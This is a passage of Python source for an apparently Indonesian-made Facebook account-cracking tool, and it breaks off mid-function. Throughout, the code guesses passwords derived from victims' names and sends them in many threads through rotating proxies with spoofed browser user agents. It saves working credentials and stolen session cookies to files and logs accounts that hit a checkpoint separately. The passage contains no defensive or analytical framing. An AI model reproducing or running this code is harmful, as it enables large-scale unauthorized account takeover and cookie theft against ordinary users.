	x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")

def passwer():
	print("")
	x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	with tread(max_workers=30) as HikmatXD:
		for koncol in id2 or id4:
			uiz,mmk = koncol.split('|')[0],koncol.split('|')[1].lower()
			prot = mmk.split(' ')[0]
			pwr = []
			if len(mmk)<6:
				if len(prot)<3:
					pass
				else:
					pwr.append(prot+'123')
					pwr.append(prot+'12345')
					pwr.append(prot+'1234')
			else:
				if len(prot)<3:
					pwr.append(mmk)
				else:
					pwr.append(mmk)
					pwr.append(prot+'123')
					pwr.append(prot+'12345')
					pwr.append(prot+'1234')
			if 'ya' in pw_tambahan:
				for xnxr in pw_ni:
					pwr.append(xnxr)
			if 'ya' in pw_belakang:
				for asoe in pw_lu:
					pwr.append(prot+asoe)
			else:pass
			if 'mobile' in metode:
				HikmatXD.submit(mobile,uiz,pwr,"m.facebook.com")
			elif 'mbasic' in metode:
				HikmatXD.submit(mbasic,uiz,pwr,"mbasic.facebook.com")
			elif 'free' in metode:
				HikmatXD.submit(free,uiz,pwr,"free.facebook.com")
			elif "mobile_v2" in metode:
				HikmatXD.submit(mobile_v2,uiz,pwr,"m.facebook.com")
			elif "bapi" in metode:
				HikmatXD.submit(api,uiz,pwr)
			elif "mobile_freefire" in metode:
				HikmatXD.submit(mobile_free_fire,uiz,pwr,"m.facebook.com")
			else:
				HikmatXD.submit(mobile,uiz,pwr,"m.facebook.com")
	print("")
	if ok != 0 or cp != 0:
		x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(garis+" kembali ")
		tanya_hal = input(f"{garis} ingin memakai check opsi detector untuk hasil crack cp ({H}y{P}/{M}t{P}) ? : {H}")
		if tanya_hal in ["y","Y","ya"]:
			check_opsi_sesudah_crack()
		elif tanya_hal in ["t","T","tidak"]:
			menu()
		else:
			menu()
	else:
		x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(garis+" kembali ")
		menu()
		
def mobile(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H])
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				x=f"\t\t\t{K2}Checkpoint{P2}\n{K2}*--> {uiz}|{pw} • {tahun(uiz)}"
				vprint(panel(x,style=f"{P3}"))
				#print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					x=f"\t\t\t{H2}Succesfully{P2}\n{H2}*--> {uiz}|{pw} • {tahun(uiz)}\n{H2}*--> {kuki}"
					vprint(panel(x,style=f"{P3}"))
					#print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					#print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					x=f"\t\t\t{H2}Succesfully{P2}\n{H2}*--> {uiz}|{pw} • {tahun(uiz)}\n{H2}*--> {kuki}"
					vprint(panel(x,style=f"{P3}"))
					#print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					#print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mobile_free_fire(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F{link_okep}%2Fv6.0%2Fdialog%2Foauth&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F'+link_okep+'%2Fv6.0%2Fdialog%2Foauth&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mobile_v2(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			#proxs2= {'http': 'socks4://'+nip}
			url = "m.facebook.com"
			headers1= {
				"Host": link_okep,
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":uiz,
